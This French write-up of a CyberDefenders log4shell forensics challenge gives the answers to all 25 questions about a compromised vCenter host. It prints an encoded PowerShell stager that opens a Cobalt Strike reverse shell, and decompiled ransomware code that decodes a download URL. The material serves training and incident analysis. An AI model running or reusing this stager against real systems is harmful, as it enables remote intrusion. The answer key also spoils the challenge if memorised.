# DetectLog4j

## Info

Category : Digital Forensics 

SHA1SUM :	6556e7d46e89bf2ea68e05cf101920e2de071a22 </br>
Published :	Jan. 15, 2022 </br>
Author :	CyberDefenders </br>
Size : 	    	2.8 GB </br>
Tags :	    	Windows Disk ransomware log4shell </br> 	

Uncompress the challenge (pass: cyberdefenders.org)

Scenario :

For the last week, log4shell vulnerability has been gaining much attention not for its ability to execute arbitrary commands on the vulnerable system but for the wide range of products that depend on the log4j library. Many of them are not known till now. We created a challenge to test your ability to detect, analyze, mitigate and patch products vulnerable to log4shell.

Tools:

- Arsenal Image Mounter
- RegistryExplorer
- RegRipper
- EventLog Explorer
- dnspy
- CyberChef
- fakenet
- VirusTotal
- IPLookUp

## Question

#### 1 - What is the computer hostname?

Avec avec **AccessData FTK Imager**, ouvrir le disque et aller à `ROOT > System32 > config` et exporter la ruche **SYSTEM**. Avec **Registry Explorer** importer la ruche et regarder `ROOT > ControleSet > Control > ComputerName`.

**Réponse : VCW65**

#### 2 - What is the Timezone of the compromised machine?

Avec **Registry Explorer** : `ROOT > SYSTEM > ControleSet > Control > TimeZoneInformation`

`TimeZoneKeyName : Pacific Standar Time` correspont à UTC-8

**Réponse : UTC-8**

#### 3 - What is the current build number on the system?
  
Avec **Registry Explorer** : `ROOT > SOFTWARE > Microsoft > Windows NT > CurrentVersion > CurrentBuild` : 14393

**Réponse : 14393**

#### 4 - What is the computer IP?

Avec **Registry Explorer** : `ROOT > SYSTEM > ControlSet > Services > Tcpip > Parameters > Interfaces > <interface> > NameServer`

**Réponse : 192.168.112.139**

#### 5 - What is the domain computer was assigned to?
  
Avec **Registry Explorer** : `ROOT > SYSTEM > ControlSet > Services > Tcpip > Parameters > DNSRegisteredAdapters > <adapter> > PrimaryDomainName`  

**Réponse : cyberdefenders.org**

#### 6 - When was myoussef user created?

Avec avec **AccessData FTK Imager** exporter Security Logs : `ROOT > windows > system32 > winevt > Logs`

Dans l'event viewer : EventId 4720 & recherche : myoussef

**Réponse : 2021-12-28 06:57:23 UTC**

#### 7 - What is the user mhasan password hint?

Avec avec **AccessData FTK Imager**, ouvrir le disque et aller à `ROOT > System32 > config` et exporter la ruche **SAM**. Avec **Registry Explorer** importer la ruche et regarder `ROOT > SAM > > Domains > Account > Users > mhasan`.

On regarde le `last write timestamp` du user mhasan. O, compare avec les autres ruches avec des noms moins intuitif `ROOT > SAM > Domains > Account > Users > 00000404 > UserPasswordHint` : https://www.linkedin.com/in/0xmohamedhasan/

**Réponse : https://www.linkedin.com/in/0xmohamedhasan/**

#### 8 - What is the version of the VMware product installed on the machine?

Avec **Registry Explorer** : `ROOT > SOFTWARE > VMware, Inc. > vCenter Server > ProductVersion` : 6.7.0.40322

**Réponse : 6.7.0.40322**

#### 9 - What is the version of the log4j library used by the installed VMware product?

Avec avec **AccessData FTK Imager**, ouvrir le disque et aller à `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services` :  log4j-core-2.11.2.jar

Note : Chercher l'endroit ou l'application stocke ses fichier **.jar**

**Réponse : 2.11.2**

#### 10 - What is the log4j library log level specified in the configuration file?

Avec avec **AccessData FTK Imager**, ouvrir le disque et aller à `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services` : log4j2.xml

Regarder les balises contenant la value `level`

**Réponse : INFO**

#### 11 - The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?

Recherche Google : "exploit log4j vcenter"

**Réponse : X-Forwarded-For**

#### 12 - The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?

Note : log4shell.huntress.com est un tester de vulnérabilité de log4j

On connait la version du vCenter (6.7), recherche Google "log4j exploit vcenter" --> "Workaround instrcution..."

Modification du Security Token Service (STS)

Rechercher dans les logs STS, avec avec **AccessData FTK Imager**, ouvrir le disque et aller à `ROOT > ProgramData > VMware > vCenter Server > runtime > VMwareSTSService > logs` : audit_events.log

**Réponse : log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a**

#### 13 - When was the first successful login to vsphere WebClient?

On regarde dans le fichier **audit_events.log** et on cherche un **LoginSuccess**

**Réponse : 2021-12-28 20:39:29 UTC**

#### 14 - What is the attacker's IP address?

On regarde dans le fichier **audit_events.log**

**Réponse : 192.168.112.128**
	
#### 15 - What is the port the attacker used to receive the cobalt strike reverse shell?

Avec avec **AccessData FTK Imager** exporter les logs Microsoft-Windows-Powershell/Operational & Admin  : `ROOT > windows > system32 > winevt > Logs`

EventID : 4104 | Exécuter une commande distante

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAANVWaW/iSBD9HH6FN0Ia0CQcCeQajTRtsMEeTDDGNgRFK2M3pqF9jN3mmNH89y0fYYdkd1ba1a60LaF2N1Wv3qu+SsPsUmMRsZkSOJi7NHAUk8DnrkqlMia2FXEfuXfvYNANJAbfn96VylYcY29BD+nwvHSWxMR3Oe0QM+x9OB3WxonPiIdrks9wFIQajrbExjGY+ZaH49CyMUf8NbYZ9610dhYmC0pszqYQglsmvp3Nns1FarnxM1f8jf3E4xClgW0x4Do5hJj7xnUCzyMpxca+2Wg0LrgxjiEczmauYIb7/mdYCvaC6DCKAgZEUvXfOGGP7YThMbYcMyIsR2n9BGMCMrkHLiE+SOEkf0n8FzexaIVzl1LJC4OIVc43OPIxvb6qOZSeV4+AMQNhgLuHpPmAxUYs4gwSscSime5KMUdD5DgRjuOLPLCz08hXXAyW9DRHx+lCaPXDP6HTibDF8GQFnfM7nXyMGOyoBaTvB17Msjc5uaMxzEXsKOA4PbIi2BsQ6+icxQIVWdp/sMyjSc7fVJKCmxZhYhBpsGcpflykO/FFzapv+Q4FwtnSOjuFUEpibAe+E2cRYTm/l84/weGwAy8kFKeHZYh3lzkOpxA7CuJgyWodbWVFYdF14KDBEmyJg6NSOUzVxqeOxeFJDbtB2ufox49jhuIX/9oYL3GEfRs7KD+dBMc1yO3Y8l1c+VQ5LzDTfFxw81Gch3quFeaH2qDYKtXqEbSHfRzBKkt+fkKAZXkSJbhUhiVLaHrYjtJfyL3giVHgaUES2bhSwF1wx5ujWirN+QPD8+fn8taKfrXTu+cjNz8K97c4Ys8PDykKb8X4ppVeUr5bOa8LpNsedYMDgiaIY9XgNd14khRHpprEtJlABvpqJZGm5ML4oAvuiDXCz5NJX9a6fRR196slkmJJ6PMHtckju09uDZnXdfAjnYG63kvI4T136s46O7lpBwkiWSwi7vpjX0N9VZeY1BO0gdrhZeR018ZmXT/ovcFQWoHv01CxqaTYnVi1+3JXF/jdZO06S1FBjd2mI+jtxnQ6MzP/sZzGUmexoqVjfp+OebLTpDSOaqx4U2w/mRtxphqUNzeke9vheX1bd01BhHkyEBI6qkObmgHSFu1ry2yHC89oQG5MbeZ7E8nfq4tQcQ6zfv3ekDJujgwc+ZQnrwuiqi6CG8P3/Pr9NLKboURskU+6GxGhwkYXx5Y7hL53Y7S85X5bN26adKFJPg851SDOLM2v7rkIeaCQynySMGOw3tabOpH3wHvX5L906L1ElqJEnFDe33VT2vXML7UnjV6vD/azKeq2TAepCGmj+qjb0pT0++Z+FLaRgNAjIanfoNEe2fod+vcbb9hXxmGgi/6T2W48En64uA7DRW+/GnxVE6WDgtnVPbN7YsMy5fhpErsTYyiPNdQarNGtJDqwHuOtc624E6q6Q621fzzwuu3RTYqXYXRjVzPb3qLJr5yemyhkM+y4/4G0/3FTF7c7Zslmvqe9G1gnOKO9VtpB31ZR1t+Yn8eT9rJuaPJwojeI3IbfHezJqw3YdlIbT34P+1oILbkF+1qTRoIkTZEzePLIzpGQ/Qjnfjo1xdVMQ3oWW1dGgV+/rte/Cm2FtPbDNazZRDgM1sLhseB3DndceZEsl9mrMM+LnFpa08C1dvKWQ6lyvARrA+y7bMW955oXJ07vT99ywHgpby4Xj9FfmOal0SvA10UP2L0ueqolsuQqcz4I6PMvhZgqVDels7JLg4VFH47vwPUHmI0wS+BdLX0vzX9e/9UUK4pXFs24hYfKUf8Fl2Yjj/Q2LdXSPH+bn7kyy97+t6k9qUsap3j5sHEqKweqppXmG1W3p6qKZ+/qbdQ/KiMK5FdpT4sJcHgpEKuld1BASCmfQtrDQwxlEneJv3B3GStJmHJZ+Q0MfgPEWlHOrwsAAA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

CyberChef --> `Frombase64 > Gunzip`

On obtient un script.ps1. On met se script dans une sandbox online. Détails réseaux --> `192.168.112.128:1337`

**Réponse : 1337**

#### 16 - What is the script name published by VMware to mitigate log4shell vulnerability?

Documentation VMware

**Réponse : vc_log4j_mitigator.py**

#### 17 - In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?

Documentation VMware ou Microsoft

**Réponse : log4j.formatMsgNoLookups**

#### 18 - What is the log4j version which contains a patch to CVE-2021-44228?

**Réponse : 2.15.0**

#### 19 - Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?

Avec avec **AccessData FTK Imager**, ouvrir le disque et extraire le jar `ROOT > Program Files > VMware > vCenter Server > VMware Identity Services` :  log4j-core-2.11.2.jar 

Rename log4j-core-2.11.2.jar --> log4j-core-2.11.2.zip

Path : `log4j-core-2.11.2.zip\org\apache\logging\log4j\core\lookup`

**Réponse : 0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E**

#### 20 - Analyze JNDILookup.class. What is the value stored in the  CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?

Installer jd-gui (decompiler java), décompiler le jar.

`org.apache.logging.log4j.core/lookup/JndiLookup.class`

```java
static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
```

**Réponse : java:comp/env/**

#### 21 - What is the executable used by the attacker to gain persistence?

Avec avec **AccessData FTK Imager**, ouvrir le disque et extraire le fichier `NTUSER.DAT` de `Administrator.WIN-B633EO9K91M`

Avec **Registry Explorer** : `ROOT > SOFTWARE > Microsoft > Windows > CurrentVersion > RunOnce` 

**Réponse : C:\Users\Adiminstrator\Desktop\baaaackdooor.exe**
	  
#### 22 - When was the first submission of ransomware to virustotal?

Après quelques recherches, note la présence d'un exe à la racine du disk `C:\`, le fichier **khonsari.exe**. On le met dans VT

**Réponse : 2021-12-11 22:57:01**

#### 23 - The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?

On peut reverse le malware avec dnspy, aller au point d'entré. On voit la méthode `webClient.DownloadString()`. Dans celle-ci des opérations de XOR sont réalisés, on peut en déduire que la variable `string text = URL_cipher` et `string text3 = key`. On peut confirmer en mettant un breakpoint sur le **return** de `webClient.DownloadString()`

```
internal static class SCVuZRaW
{
	// Token: 0x06000007 RID: 7 RVA: 0x00002428 File Offset: 0x00000628
	private static void Main()
	{
		List<string> list = new List<string>();
		WebClient webClient = new WebClient();
		string text = "/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007f\u0006;3";
		string text2 = text;
		string edhcLlqR = text2;
		string text3 = "GoaahQrC";
		string text4 = text3;
		string vnNtUrJn = text4;
		webClient.DownloadString(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn));
```

URL : http://3.145.115.94/zambos_caldo_de_p.txt

**Réponse : GoaahQrC**

#### 24 - What is the ISP that owns that IP that serves the text file?

2 possibilités : 
- On a l'IP donc on peut faire un IP lookup sur 3.145.115.94
- Upload le malware dans VT ou dans une sandbox online et voir les connexions effectués par le malware

**Réponse : Amazon**

#### 25 - The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?

On connait la famille de malware, 2 options :

- chercher de la dcumentation sur l'exe
- reverse l'exe puis cyberchef `Unescape string > XOR`

```
private static bool LxqQXinF(string YzmfzBzk)
	{
		string text = "\u007f\u001d\0\a\u000f\"\u000e%8";
		string text2 = text;
		string edhcLlqR = text2;
		string vnNtUrJn = "QvhhaQoW";
		if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn)))
		{
			string text3 = "g\u001d/.";
			string edhcLlqR2 = text3;
			string text4 = "ItAGEocK";
			string vnNtUrJn2 = text4;
			if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
			{
				string text5 = "\r\a2";
				string edhcLlqR3 = text5;
				string text6 = "diYplLvh";
				string text7 = text6;
				string vnNtUrJn3 = text7;
				if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR3, vnNtUrJn3)))
				{
					return YzmfzBzk.Equals(SCVuZRaW.HtqeFwaI);
				}
			}
		}
		return true;
	}
```

`g\u001d/. + Unescape string > XOR par ItAGEocK = .ini`

**Réponse : ini**
